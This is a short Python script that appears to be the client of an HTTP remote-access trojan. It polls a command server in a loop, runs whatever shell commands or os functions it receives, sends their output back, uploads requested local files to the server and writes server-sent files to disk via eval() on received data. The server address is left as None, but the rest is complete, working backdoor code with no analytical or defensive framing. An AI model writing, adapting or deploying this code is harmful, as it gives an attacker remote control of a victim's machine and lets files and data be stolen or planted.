#!/usr/bin/python3 
import requests
import subprocess
from os import path

def os(server,command):
    c=command.split("-")[1]
    AT = c.split()
    attribute = AT[0]
    module = __import__("os")
    try:
        function = getattr(module, attribute)
        if len(AT) == 2:
            argument = AT[1]
            try:
                A = function(argument)
                R = requests.post(server, A)
            except Exception as E:
                R = requests.post(server, (str(E).encode("utf-8")))
        else:
            try:
                A = function()
                R = requests.post(server, A)
            except Exception as E:
                R = requests.post(server, (str(E).encode("utf-8")))

    except Exception as E:
        R = requests.post(server, (str(E).encode("utf-8")))

def process(server,c):
    P = subprocess.Popen(c, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    OUT = P.stdout.read()
    ERR = P.stderr.read()
    if not OUT:
        R = requests.post(server, ERR)
    else:
        R = requests.post(server, OUT)
    
def fileReciver(server,command):
    f=command.split("upload ")[1]
    dataDict=eval(f)
    fileName=dataDict['file']
    fileToSave=dataDict['name']
    data=dataDict['data']
    try:
        with open(fileToSave, 'wb') as o:
            o.write( data )
    except Exception as e:
        R = requests.post(server,(str(e)).encode('utf-8'))

def fileSender(server,command):
    fileName=command.split("download ")[1]
    if path.exists(fileName):
        server+="/upload"
        file={'file': open(fileName,"rb"),'name':fileName }
        requests.post(server,files=file)     
    else:
        R = requests.post(server,("File missing").encode('utf-8'))

server=None
while True:
    try:
        RevcivedData = requests.get(server)
        command = RevcivedData.text
        if command.startswith("download "):
            fileSender(server,command)
        elif command.startswith("upload "):
            fileReciver(server, command)
        elif command.startswith("-"):
            os(server,command)
        else:
            process(server,command)

    except Exception as e:
        pass
    